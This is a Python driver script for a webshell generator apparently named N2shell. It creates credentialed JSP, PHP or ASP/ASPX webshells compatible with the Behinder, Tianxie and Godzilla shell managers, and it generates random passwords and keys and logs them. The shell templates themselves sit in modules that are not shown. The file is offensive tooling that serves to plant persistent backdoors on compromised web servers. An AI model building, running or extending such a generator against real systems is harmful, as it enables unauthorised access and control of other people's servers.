import sys,os
from datetime import datetime
import core.cv as cv
import core.bx as bx
import core.tx as tx
import core.gsl as gsl

class Logger(object):#print2log https://www.cnblogs.com/henry2019/p/14313948.html
    def __init__(self, fileN='Default.log'):
        self.terminal = sys.stdout
        self.log = open(fileN, 'a')

    def write(self, message):
        '''print实际相当于sys.stdout.write'''
        self.terminal.write(message)
        self.log.write(message)

    def flush(self):
        pass

def logo():
    print('''
 | \ | |__ \    | |        | | |
 |  \| |  ) |___| |__   ___| | |
 | . ` | / // __| '_ \ / _ \ | |
 | |\  |/ /_\__ \ | | |  __/ | |
 |_| \_|____|___/_| |_|\___|_|_|
''')

shell_type = ["jsp","jspx","php","asp","aspx",".net","c#"]
bx_as = ["bx","b","冰蝎","冰鞋","冰"]
tx_as = ["tx","t","天蝎","天"]
gsl_as = ["god","gsl","gls","gl","g","哥斯拉","Godzilla","godzilla"]
default_manage = "bx" #shell管理工具,默认bx，可以修改

logfolder = "log"
if os.path.exists(logfolder) == False:  # 判断文件夹是否存在
    os.mkdir(logfolder)
try :
    logo()
    if len(sys.argv) == 2 and sys.argv[1] in shell_type:
        type = sys.argv[1]
        manage = default_manage
        print("[默认冰蝎,修改默认default_manage]\n")
    elif len(sys.argv) >= 3 and sys.argv[1] in shell_type and sys.argv[2] in bx_as+tx_as+gsl_as:
        type = sys.argv[1]
        manage = sys.argv[2]
    else:
        exit()

    sys.stdout = Logger("./log/"+manage+"_"+type+"_"+datetime.now().strftime("%Y_%m_%d_%H_%M_%S")+'.log')
    
    pwd = cv.grs()
    key = cv.grs()
    pwd_md5 = cv.cmd5(pwd)[0:16] 
    print("pwd:"+pwd+"\nkey:"+key+"(Godzilla key)")
    print("pwd_md5:",pwd_md5)
    print("-"*64)
    
    if manage in bx_as:
        bx.get(type,pwd_md5)

    elif manage in tx_as:        
        tx.get(type,pwd,pwd_md5)
   
    elif manage in gsl_as:
        gsl.get(type,pwd,key)
    
    print("-"*64)   

except:
    print(" tips: python3 main.py php")
    print(" shell type: "+str(shell_type))


